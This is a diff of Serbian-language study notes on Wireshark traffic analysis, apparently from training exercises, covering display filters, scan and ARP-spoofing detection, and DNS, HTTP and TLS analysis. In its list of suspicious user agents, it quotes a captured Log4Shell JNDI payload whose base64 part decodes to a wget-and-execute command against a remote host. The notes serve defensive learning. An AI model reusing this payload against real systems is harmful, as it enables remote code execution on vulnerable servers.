@@ -7,7 +7,7 @@ otvorimo trazeni fajl kroz wireshark i idemo na statistic > capture file propert
 
 u capture file properties vidimo i koji je ukupan broj paketa. Na ovom mestu imamo i hes fajla i mnoge druge podatke   
 
-## disekcija paketa i detalji paketa
+# disekcija paketa i detalji paketa
 
 wireshark koristi OSI slojeve za razlaganje paketa.  
 
@@ -28,7 +28,7 @@ zadatak je da se istrazi paket... da odgovorimo na pitanja potrebno je istraziva
 poslednji zadatak je da se prosle e-tag value. Za to moramo da idemo u http sekciju nadjemo E-tag > desni klik na njega > copy  > value  
 
 **pronalazak paketa:**
-- go > go to packet -otvori se meni za pretragu paketa po id-ju  
+- go > go to packet -opcije u wireshark meniju: otvori se meni za pretragu paketa po id-ju  
 - edit > find packet -pronadji paket po sadrzaju (pretrage mozemo podesiti da budu osetljiva na velika i mala slova)  
 
 > oznacavanje paketa, ako zelimo da oznacimo nesto na sta treba obratiti paznju... desni klik na paket > mark/unmark
@@ -41,7 +41,7 @@ poslednji zadatak je da se prosle e-tag value. Za to moramo da idemo u http sekc
 
 > format prikaza fremena, podrazumevano u wiresharku su postavljene sekunde od pocetka snimanja a mi bi trebali promeniti u UTC date and time of day (view > time display format)  
 
-> analyze > expert information da vidimo poruke i specificna stanja protokola koji mogu da ukazuju na anomalije i probleme  
+> analyze > expert information -da vidimo poruke i specificna stanja protokola koji mogu da ukazuju na anomalije i probleme  
 > ovde moze da se udje i skroz u donjem levom cosku crvena ikonica
 
 **u jednom zadatku se trazi da se istraze komentari paketa**
@@ -49,19 +49,20 @@ poslednji zadatak je da se prosle e-tag value. Za to moramo da idemo u http sekc
 sa opcijom go to packet pronadjemo paket po id-ju
 
 - u komentaru ovog paketa se nalazi uputstvo da skocimo na drugi paket i istrazimo jpg deo tog paketa (dobijemo id)  
-- odemo na jpg i exportujemo na desktop (desni klik na jpg deo paketa i export packet bytes i sacuvamo na desktop)
-- kada sliku sacuvamo na desktop idemo kroz terminal do nje i uradimo `md5sum slika.jpg`
-- drugi nacin za ovo bez pronalaska paketa preko id-a nego odmah kroz: file > export objects > http > pretrazimo sa jpg i onda vidimo broj paketa 
+- odemo na jpg i exportujemo na desktop (desni klik na jpg deo paketa > export packet bytes i sacuvamo na desktop)
+- kada sliku sacuvamo na desktop idemo kroz terminal do nje i uradimo > md5sum slika.jpg
+- drugi nacin za ovo bez pronalaska paketa preko id-a nego odmah kroz: file > export objects > http > pretrazimo sa jpg i onda vidimo broj paketa
 
-**potrebno je naci nesto iz nekog .txt fajla **
+**potrebno je naci nesto iz nekog .txt fajla**
+
 - file > export objects > odaberemo http > u pretragu kucamo txt > i cuvamo na desktop taj pronadjeni fajl (koji odgovara id-ju paketa), zatim otvorimo i procitamo flag 
-- drugi nacin da nadjemo paket po id-ju (paket iz prethodnog zadatka) i nadjemo pod HTTP > line based text data  
+- drugi nacin da nadjemo paket po id-ju (paket iz prethodnog zadatka) i nadjemo pod HTTP > line based text data
 
-**zadatak da se procita koliko ima warning-a**\
+**procitati koliko ima warning-a**
 
 - odemo u expert information i prosirimo postojeci prozor da bi mogli da vidimo na desnoj strani ukupan broj za alert koji nas interesuje  
 
-## filtriranje paketa 
+# filtriranje paketa 
 
 wireshark ima mocan mehanizam koji filtrira pakete, koji omogucava suzavanje saobracaj i fokus na dogadjaje koji nas zanimaju  
 
@@ -71,15 +72,15 @@ u istom meniju imamo i colorise conversation koji se koristi da oboji i istakne 
 
 ove dve opcije mogu da se pokrenu kroz view karticu  
 
-desni klik > pripremi kao filter znaci da kreiramo filter, dodaje upit i ceka komandu za izvrsenje 
+desni klik > pripremi kao filter -znaci da kreiramo filter, dodaje upit i ceka komandu za izvrsenje 
 
-analyze > primeni kao kolonu pruza osnovne informacije o svakom paketu (moze se uci i preko desnog klika)  
+analyze > primeni kao kolonu -pruza osnovne informacije o svakom paketu (moze se uci i preko desnog klika)  
 
-pracenje strima je opcija koja nam omogucava rekonstruisanje tokova i prikaz sirovog saobracaja kako je predstavljen na nivou aplikacije (moze i preko menija desnog klika ili analyze > follow)  
+pracenje strima je opcija koja nam omogucava rekonstruisanje tokova i prikaz sirovog saobracaja kako je predstavljen na nivou aplikacije (moze i preko menija desnog klika ili `analyze > follow`)  
 
 **pronaci paket 4 i u njemu http i primeniti ga kao filter**
 
-- desni klik na http, primenim ga kao filter (gore u traci gde se kuca tekst vidimo koji je filter query: http)  
+- desni klik na http > primenim ga kao filter (gore u traci gde se kuca tekst on automatski popuni i vidimo koji je filter query: http)  
 
 **koliko je ukupno ostalo paketa nakon primene filtera**
 
@@ -88,11 +89,12 @@ pracenje strima je opcija koja nam omogucava rekonstruisanje tokova i prikaz sir
 **otici na paket 33790, pratiti http stream i videti odgovore. Proveriti odgovore na veb serveru i odgovoriti kolikko je ukupno umetnika**
 
 - u zadatku kaze da se radi sa: desni klik na paket > follow > tcp stream, ali ja tako ne mogu da nadjem resenje
-- radim file > export object... u pretragu za export kucam artist i prikaze se artist.php (proverim da je to taj id paketa koji trazim) i onda sacuvam fajl na desktop. Nakon toga otvorim fajla (sa pluma) i pronadjem koliko ima artista u kodu (artist=1, ...)  
+- radim file > export object > u pretragu za export kucam artist i prikaze se artist.php (proverim da je to taj id paketa koji trazim) i onda sacuvam fajl na desktop. Nakon toga otvorim fajla (sa pluma) i pronadjem koliko ima artista u kodu (artist=1, ...)  
 
 # WireShark Packet Operations 
 
 meni statistika pruza dosta dodatnih opcija: 
+
 - resolved address: prikazuje razresene ip adrese i dns
 - protocol hierarchy: prikazuje statistiku koriscenih protokola i portova 
 - conversations: prikazuje listu razgovora izmedju dva endopoint-a (ethernet, ipv4, ipv6, TCP, UDP) 
@@ -116,7 +118,7 @@ sad odem na statistic > endopints i ukljucim name resolutions i pronadjem mac ad
 
 **koji je broj ip adresa povezanih sa kansas city**
 
-prvo moram ukljuciti opciju:  edit > preferences > name resolkution > maxMind database.   
+prvo moram ukljuciti opciju:  edit > preferences > name resolution > maxMind database.   
 
 Onda pogledati u endpoints
 
@@ -126,7 +128,7 @@ edit > preferences > name resolution i ukljucim resolve ip addres (a mogu i tran
 
 iskljucim name resolution da bih video adresu 
 
-## u statistici imamo jos opcija za prikaz
+### u statistici imamo jos opcija za prikaz
 
 u tabu statistic imamo jos:
 
@@ -136,11 +138,11 @@ u tabu statistic imamo jos:
 
 **koja je najcesca odredisna adresa**
 
-vidimo u statistic > ipv4 > source and destination adress > zatvorimo surce deo i sortiramo po count prikaz 
+vidimo u statistic > ipv4 > source and destination adress > zatvorimo surce deo i sortiramo po count prikaz
 
 **koji je max vreme zahteva i odgovora na uslugu za dns pakete**
 
-statistic > dns i pod service stats nadjemo max vrednost 
+statistic > dns i pod service stats nadjemo max vrednost  
 
 **koliki je broj ip zahteva koje je izvrsio rad[.]msn[.]com**
 
@@ -154,7 +156,7 @@ ovo je najmocnija funkcija wireshark-a. Podrzava 3000 protokla i omogucava pretr
 
 pregled filtera analyze > display filters 
 
-operatori za filtriranje su isti kao i u programiranju (!=, ==, &&, || itd.)  
+operatori za filtriranje su isti kao i u programiranju (`!=, ==, &&, ||` itd.)  
 
 traka sa filterima boji filtere kao vazeci, nevazeci i upozorenje (odnosi se se na rad filtera)  
 
@@ -162,27 +164,27 @@ filteri se kucaju u traku iznad prikaza paketa i tu imamo jos opcija za filter..
 
 primer ip filtera:  
 
-- ip.addr == neka adresa/24 - prikazi sve pakete koji sadrze ip adrsu ili adrese iz podmreze  
-- ip.src  
-- ip.dst  
+- `ip.addr == neka adresa/24` prikazi sve pakete koji sadrze ip adrsu ili adrese iz podmreze  
+- `ip.src` izvorna adresa 
+- `ip.dst` odredisna adresa  
 
 primer tcp/udp filtera:  
 
-- tcp.port == 80 ili udp.port == 80
-- tcp.srcport == ili udp.srcport  
-- tcp.dstport == ili udp dstport
+- `tcp.port == 80 ili udp.port == 80`
+- `tcp.srcport == xx` `udp.srcport == xx` 
+- `tcp.dstport == xx` `udp dstport == xx`
 
 drugi filteri:  
 
-- http - prikazi sve http pakete  
-- dns - prikazi sve dns pakete  
-- http.response.code == 200 - prikazi sve http sa 200 OK  
-- dns.flags.response == 0 - prikazi sve dns zahteve  
-- dns.flags.response == 1 - prikazi sve dns odgovore  
-- http.request.method == "GET"  
-- dns.qry.type == 1 - sve DNS A zapise  
+- `http` prikazi sve http pakete  
+- `dns` prikazi sve dns pakete  
+- `http.response.code == 200` prikazi sve http sa 200 OK  
+- `dns.flags.response == 0` - prikazi sve dns zahteve  
+- `dns.flags.response == 1` - prikazi sve dns odgovore  
+- `http.request.method == "GET"` http get metoda 
+- `dns.qry.type == 1` prikazi sve DNS A zapise (a zapis osnovni tip zaipsa koji prikazuje ime domena i ip adresa)  
 
-**wireshark ima opciju analyze > display filter expression. Ovde vidimo detalje za odredjeni protokol i ostale informacije koje se mogu dodeliti nekom filteru**  
+wireshark ima opciju analyze > display filter expression. Ovde vidimo detalje za odredjeni protokol i ostale informacije koje se mogu dodeliti nekom filteru  
 
 **koliki je broj ip paketa**
 
@@ -196,7 +198,7 @@ pisem filter: `ip.ttl < 10`
 
 `tcp.port == 4444`
 
-> kad kucam filtere cak mi i izadje pomoc u vidu auto-complete-a
+> kad kucam filtere cak mi i izadje pomoc u vidu auto-complete
 
 **koji je broj http get zahteva poslatih na port 80re**
 
@@ -204,34 +206,34 @@ ovde moram kombinovati dva upita sa and: `http.request.method == "GET" && tcp.ds
 
 **koji je broj type A DNS query-ja**
 
-dns.qry.type == 1 
+`ns.qry.type == 1`  
 
 ovde postoji problem jer meni primenom ovog filtera pokazuje da je resnje 106 (a to nije resenje)  
 
 isti je problem kad apokusam preko analyze > display filter expression i odaberem filter za dns qry type  
 
-resenje je da se primeni i filter za flag response jer nam bez toga trazeni rezultat nije tacan  
+treba da se primeni i filter za flag response jer nam bez toga trazeni rezultat nije tacan  
 
 **resenje je:**  
 
 `dns.qry.type == 1 && dns.flags.response == 1`
 
-### napredni filteri  
+# napredni filteri  
 
-filter contains: http.server contains "Apache" - svi http paketi ciji server sadrzi odredjene reci    
+`filter contains: http.server contains "Apache"` svi http paketi ciji server sadrzi odredjene reci    
 
-filter matches: http.host matches "\.(php|html)" - svi http paketi ciji hostovi sadrze .php ili .html  
+`filter matches: http.host matches "\.(php|html)"` svi http paketi ciji hostovi sadrze .php ili .html  
 
-filter in: tcp.port in {80 443 8080} - svi tcp paketi ciji portovi sadrze odredjene vrednosti  
+`filter in: tcp.port in {80 443 8080}` svi tcp paketi ciji portovi sadrze odredjene vrednosti  
 
-filter upper: upper(http.server) contains "APACHE" - svu http paketi i njihovi serveri to uppercase koji sadrza odredjenu rec  
+`filter upper: upper(http.server) contains "APACHE"` svu http paketi i njihovi serveri to uppercase koji sadrza odredjenu rec  
 
-filter lower: lower(http.server) contains "apache" - isto samo lowercase  
+`filter lower: lower(http.server) contains "apache"` isto samo lowercase  
 
-filter string: string(frame.number) matches "[13579]$" - konveruj sve frame number u string vrednosti i navedi frejmove koji zavrsavaju neparnim vrenodstima  
+`filter string: string(frame.number) matches "[13579]$"` konveruj sve frame number u string vrednosti i navedi frejmove koji zavrsavaju neparnim vrenodstima  
 
 pored polja za unos filtera imamo dugme obelezivac da ih mozemo koristiti vise puta bez ponovnog kucanja, kad kliknemo na to dugme:
-save this filter > new display filter  
+save this filter > new display filter 
 
 wireshark profli sluze za pamcenje konfiguracija sto je kosirno za za svaki slucaj istrazivanja koji zahteva drugaciji skup pravila bojenja i dugmadi za filtriranje
 edit > configuration profiles > default na desni klik imamo switch to > pa nas novi default profil  
@@ -254,8 +256,9 @@ edit > configuration profiles > default na desni klik imamo switch to > pa nas n
 
 **promeni profil na checksum control, koji je broj bad tcp checksum paketa**
 
-edit > config profiles > checksum control profile, nakon toga otvorim analyze > display filter expression i kreiram filter pod TCP: tcp checksum status == bad
-kreirani filter izgleda ovako: `tcp.checksum.status == 0`
+edit > config profiles > checksum control profile  
+
+nakon toga otvorim analyze > display filter expression >  i kreiram filter pod TCP: tcp checksum status == bad kreirani filter izgleda ovako: `tcp.checksum.status == 0`
 
 Use the existing filtering button to filter the traffic. What is the number of displayed packets?
 
@@ -263,11 +266,11 @@ Use the existing filtering button to filter the traffic. What is the number of d
 
 ovo dugme se nalazi odmah sa desne strane na kraju trake-prozora za kucanje filtera, kada se odabere checksum profile, klikom na to dugme treba da dobijemo predefinisani upit  
 
-`(http.response.code == 200 ) && (http.content_type matches "image(gif||jpeg)")`
+filter je:  `(http.response.code == 200 ) && (http.content_type matches "image(gif||jpeg)")`
 
 # Wireshark - traffic analysis  
 
-## nmap scans
+# nmap scans
 
 nmap skeniranje: skeniranje TCP konekcija, SYN i UDP  
 
@@ -330,7 +333,7 @@ onda je preostali port - 68 onaj koji nije vratio gresku. Ovo mozemo da vidimo i
 
 nase je samo da pretrazimo portove koji nisu vratili gresku a da su u opsegu 55-70  
 
-## arp poisoning (man in the middle)
+# arp poisoning (man in the middle)
 
 arp protokol: radi na lok mrezi, omogucava komunikaciju izmedju mac adresa, nije bezbedan protokol, nije protokol za rutiranje, nema funkciju autentifikacije, uobicajeni obrasci su zahtev odgovor najava i besplatni paketi  
 
@@ -356,7 +359,7 @@ ubacimo fajl u wireshark koji je za ovaj zadatak...
 
 prvo kucamo pretragu skeniranja: `arp.dst.hw_mac==00:00:00:00:00:00`  
 
-kada nam ovo izbaci rezultate idemo desni klik na sumnjivu aktivnost i applay as filter > ...and selected. Sa ovim uzimamo mac adresu. Filter sada izgleda ovako `(arp.dst.hw_mac==00:00:00:00:00:00) && (eth.src == 00:0c:29:e2:18:b4)`    
+kada nam ovo izbaci rezultate idemo desni klik na sumnjivu aktivnost i `applay as filter > ...and selected`. Sa ovim uzimamo mac adresu. Filter sada izgleda ovako `(arp.dst.hw_mac==00:00:00:00:00:00) && (eth.src == 00:0c:29:e2:18:b4)`    
 
 na kraj filtera dodajemo `&& (arp.opcode==1)` da bi smo istrazili samo arp zahteve umnjivog karaktera  
 
@@ -364,7 +367,7 @@ konacan filter izgleda ovako: `(arp.dst.hw_mac==00:00:00:00:00:00) && (eth.src =
 
 **koliki je broj http paketa koje je napadac primio**
 
-primenimo filter iz prethodnog zadatka. Odaberemo jedan dogadjaj i kliknemo na njega. Ona gledamo njegove detalje Ethernet > source > address i onda na to desni klik > apply as filter > selected  (samo selected ne ...and selected jer ce tad na postojeci upit dodati ovaj)  
+primenimo filter iz prethodnog zadatka. Odaberemo jedan dogadjaj i kliknemo na njega. Ona gledamo njegove detalje `Ethernet > source > address i onda na to desni klik > apply as filter > selected`  (samo selected ne ...and selected jer ce tad na postojeci upit dodati ovaj)  
 
 filter koji dobijemo sa ovim je: `eth.addr == 00:0c:29:e2:18:b4` i mi na njega rucno dodamo jos and http, tako da je konacni filter:  
 
@@ -396,9 +399,9 @@ konacan filter izgleda ovako: `((eth.addr == 00:0c:29:e2:18:b4 && http) ) && (ur
 
 - onda na dobijenim rezultatima idemo i gledamo za korisnika client354 trazimo komentar koji je ostavio u toj formi  
 
-## identify host: DHCP, NetBIOS, Kerberos
+# identify host: DHCP, NetBIOS, Kerberos
 
-## DHCP
+# DHCP
 
 u poslovnim mrezama se zna unapred odredjeni sablon identifikacije hostova (imena hostova)  
 
@@ -414,7 +417,7 @@ wireshark filteri:
 - `dhcp.option.domain_name contains "keyword"` - ack: ime domena i dodeljeno vreme zakupa
 - nak - preporuka da se cita umesto da se filtrira  (poruka detalji, razlog, odbijanja)
 
-## NetBIOS (NBNS)
+# NetBIOS (NBNS)
 
 omogucava aplikacijama na razlicitim hostovima da medjusobno komuniciraju  
 
@@ -423,7 +426,7 @@ wireshark filter:
 - `nbns`
 - `nbns.name contains "keyword"`  
 
-## Kerberos 
+# Kerberos 
 
 podrazumevan za auth microsoft windows domena. Autentifikacija 2 ili vise racunara preko nepouzdane mreze  
 
@@ -470,11 +473,11 @@ primenimo filter i idemo u detlajie na: kerberos > cname > cname string
 
 `kerberos.CNameString contains "$"`
 
-## Tunneling traffic: DNS, ICMP  
+# Tunneling traffic: DNS, ICMP  
 
 tunneling je zapravo preusmeravanje portova, bezbedan prenos podataka ka segmentima i zonama mreze. Spaja privatnu mrezu sa internetom i obrnuto  
 
-## icmp analiza  
+# icmp analiza  
 
 icmp je protokol za kontrolne poruke i dizajniran je za dijagnostifikovanjei prijavljivanje problema u mreznoj komunikaciji. Protokol je mreznog sloja i koristi ze za DoS napade i kradje podataka C2 tunelovanja  
 
@@ -487,7 +490,7 @@ wireshark filter:
 - `icmp`
 - `data.len > 64 and icmp`
 
-## dns analiza  
+# dns analiza  
 
 dns je zaduzen za konvertovanje ip adresa domena u ip adrese (iz logickih u fizicke). Posebno je ranjiv na izmene lokalnog dns fajla (kada poznate dns prevedene adrese ne zahteva od provajdera nego cita lokalno iz fajla kako bi ustedio operaciju) - **to sam radio na pentestingu**  
 
@@ -522,8 +525,7 @@ kada kliknemo na deo sirovih bajtova on nam u levom meniju detalja oznaci to mes
 
 `dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"`
 
-
-## analiza FTP  
+# analiza FTP  
 
 ftp je protokol koji je dizajniran za lak prenos fajlova, i zapravo je vise jednostavan nego bezbedan  
 
@@ -560,7 +562,7 @@ izvrsimo upit i u detaljima ftp vidimo komandu
 
 `ftp contains "CHMOD"`
 
-## analiza HTTP 
+# analiza HTTP 
 
 protokol koji jse koristi za klijent server arhitekturu: zahtev-ogovor  
 
@@ -638,14 +640,21 @@ Nisam skontao kako treba da prepoznam koji je anomalan user agent, verovatno kad
 
 Anomalni user agneti:  
 
-> Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10  -ovo je sumnjivo nzm zasto
-> Mozilla/5.0 (compatible; Nmap Scripting Engine; https[://]nmap[.]org/book/nse[.]html)  -skener portova 
-> Wfuzz/2.4   -alat za bruteforce 
+> Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10  -ovo je sumnjivo nzm zasto  
+
+> Mozilla/5.0 (compatible; Nmap Scripting Engine; https[://]nmap[.]org/book/nse[.]html)  -skener portova   
+
+> Wfuzz/2.4   -alat za bruteforce   
+
 > sqlmap/1.4#stable (http[://]sqlmap[.]org)  -automatski sql injection
-> ${jndi:ldap[://]45[.]137[.]21[.]9[:]1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}  -logshell, daljinsko izvrsavanje 
-> Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
-> curl/7.68.0	-CLI alat, često korišćen za testiranje i napade
-> python-requests/2.25.1	-Python skripta
+> ${jndi:ldap[://]45[.]137[.]21[.]9[:]1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}  -logshell, daljinsko izvrsavanje   
+
+> Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0  
+
+> curl/7.68.0	-CLI alat, često korišćen za testiranje i napade  
+
+> python-requests/2.25.1	-Python skripta  
+
 
 ovo vazi sve pod uslovom da napadaci ne sakrivaju alat koji koriste !! 
 
@@ -671,7 +680,7 @@ znaci istog user agenta iz prethodnog zadatka enkodujemo, vidimo onu wget komand
 
 defang i enkodovanje radim na cyber chef, ali defang mogu i rucno, umesto . stavljam [.]   
 
-## analiza HTTPS  
+# analiza HTTPS  
 
 HTTPS koristi TLS protokol za zasticenu komunikaciju, vise je otporan na presretanje. Nemoguce je pregledati prenete podatke bez parova kljuceva  
 
@@ -694,7 +703,7 @@ da bi to uradili treba da podeismo promenljivu okruzenja i kreiramo SSLKEYLOGFIL
 
 parovi kljuceva se kreiraju  po seseiji u vreme povezivanja tako da je vazno pisati kljuceve tokom snimanja saobracaja, u suprotnom nece biti moguce generisati datoteku.  
 
-menjanje podesavanja je na: `edit > preferences > protocols > tls` i mozemo da dodamo ili uklonimo fajl sa kljucevima (premaster secret lof filename)   
+menjanje podesavanja je na: edit > preferences > protocols > tls i mozemo da dodamo ili uklonimo fajl sa kljucevima (premaster secret lof filename)   
 
 - `http2`
 
@@ -714,7 +723,7 @@ filter pretrazuje zahteve poslate od klijenta ka serveru i moram oda izuzmemo mr
 
 **desifruj saobracaj pomocu datog key log fajla. koji je broj http2 paketa**
 
-`edit > preferences > protocols > tls` prvo odemo ovde u na browse ubacimo prilozen fajl  
+edit > preferences > protocols > tls prvo odemo ovde u na browse ubacimo prilozen fajl  
 
 nakon toga ukucamo https filter i izbrojimo koliko ima desifrovanih paketa
 
@@ -732,13 +741,13 @@ onda idemo na detalje pa na http2 > stream > header:authority  ... kopiram ga sa
 
 u napomeni stoji da uradim export object. To i uradim... 
 
-> podsetnik: `file > export object > http` i odaberem save all, i sacuvam na desktop. Fajl .ico ne mogu da otvorim ali ovaj drugi otvorim uz pomoc vlm i odmah vidim flag  
+> podsetnik: file > export object > http i odaberem save (all), i sacuvam na desktop. Fajl .ico ne mogu da otvorim ali ovaj drugi otvorim uz pomoc vlm i odmah vidim flag  
 
-## lov na kredencijale otvorenog teksta 
+# lov na kredencijale otvorenog teksta 
 
 u ovom slucaju nije lako uociti da li je bruteforce ili je korisnik pogresno ukucao svoje akreditive (jer je predstavljeno na nivou paketa i kredencijale vidimo kao listu)  
 
-wireshark ima opciju za pregled kredencijala: `tools > credentials` ova funkcija radi samo na verzijama wiresharka v3.1 +  
+wireshark ima opciju za pregled kredencijala: tools > credentials ova funkcija radi samo na verzijama wiresharka v3.1 +  
 
 ova funkcija radi samo na odredjenim protkolima i ne treba potpuno oslanjati na nju da bi smo proverili plain text u saobracaju  
 
@@ -756,11 +765,11 @@ tu vidimo detalje za svaki paket koji odaberemo. Za lozinku su request command: 
 
 postoji drugo resenja da request command: PASS (iz detalja paketa) primenimo kao filter, i kada izvrsimo filter odmah ce nam se u tabeli pokazati prazno mesto za vrednost lozinke  
 
-## prakticni rezultati  
+# rezultati (firewall pravila) 
 
 wireshark moze da nam pomogne da kreiramo firewall pravila u nekoliko klikova. 
 
-odemo na `tools > firewall acl rules` otvara se novi prozor koji nam daje kombinaciju pravila zasnovanih na ip, portu i mac-u.  
+odemo na tools > firewall acl rules otvara se novi prozor koji nam daje kombinaciju pravila zasnovanih na ip, portu i mac-u.  
 
 ova pravila se generisu za implementaiciju na spoljasnjem zidu firewalla 
 
@@ -777,11 +786,10 @@ Windows Firewall (netsh new/old format)
 
 **selektuj paket 99, napravi pravilo za ipfirewall (ipfw). koje je pravilo za odbijanje source ipv4 adrese**
 
-odemo na `tools > firewall acl rules` odaberemo dole pravila za ipfirewall (ipfw), oznacimo inbound i deny i prekopiramo pravilo koje odbija ipv4 source adresu  
+odemo na tools > firewall acl rules odaberemo dole pravila za ipfirewall (ipfw), oznacimo inbound i deny i prekopiramo pravilo koje odbija ipv4 source adresu  
 
 **selektuj paket 231, napravi pravilo za ipfirewall (ipfw). koje je pravilo za dozvoljavanje mac adrese odredista**
 
-isto odemo na `tools > firewall acl rules` odaberemo dole isto ipfirewall i iskljucimo deny opciju i kopiramo pravilo koje odgovara za allow mac destination address  
-
+isto odemo na tools > firewall acl rules odaberemo dole isto ipfirewall i iskljucimo deny opciju i kopiramo pravilo koje odgovara za allow mac destination address  
 
 
